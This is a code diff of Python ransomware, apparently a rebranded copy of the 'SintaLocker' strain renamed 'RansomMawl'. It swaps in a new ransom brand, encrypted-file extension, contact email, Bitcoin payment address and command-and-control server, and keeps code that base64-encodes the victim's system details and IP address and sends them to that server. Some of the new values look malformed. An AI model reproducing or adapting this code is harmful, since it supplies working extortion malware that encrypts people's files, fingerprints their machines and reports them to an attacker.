@@ -3,14 +3,14 @@ import SintaRegistery
 import SintaChangeWallpaper
 from Crypto import Random
 from Crypto.Cipher import AES
-rmsbrand = 'SintaLocker'
-newextns = 'sinta'
-encfolder = '__SINTA I LOVE YOU__'
-email_con = 'sinpayy@yandex.com'
-btc_address = '1NEdFjQN74ZKszVebFum8KFJNd9oayHFT1'
+rmsbrand = 'RansomMawl'
+newextns = 'Mawl'
+encfolder = '__MAWL I LOVE YOU__'
+email_con = 'mawlguard@aclcbutuan.edu.ph.com'
+btc_address = '2ihz1jYkzX8Z4s6d8h3vX9f5t6g7h8j9k0L'
 userhome = os.path.expanduser('~')
-my_server = 'http://www.dobrebaseny.pl/js/lib/srv/'
-wallpaper_link = 'http://wallpaperrs.com/uploads/girls/thumbs/mood-ravishing-hd-wallpaper-142943312215.jpg'
+my_server = 'http://192.168.0.107:8000/js/lib/srv/'
+wallpaper_link = 'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.ytimg.com%2Fvi%2Ff6VvWWcqkD8%2Fmaxresdefault.jpg&f=1&nofb=1&ipt=ae3e0753bd8b1c5fb6a61e68980147536a0c84cfd930240c1f28efbddf1b57f3'
 victim_info = base64.b64encode(str(platform.uname()))
 configurl = my_server + 'api.php?info=' + victim_info + '&ip=' + base64.b64encode(socket.gethostbyname(socket.gethostname()))
 glob_config = None
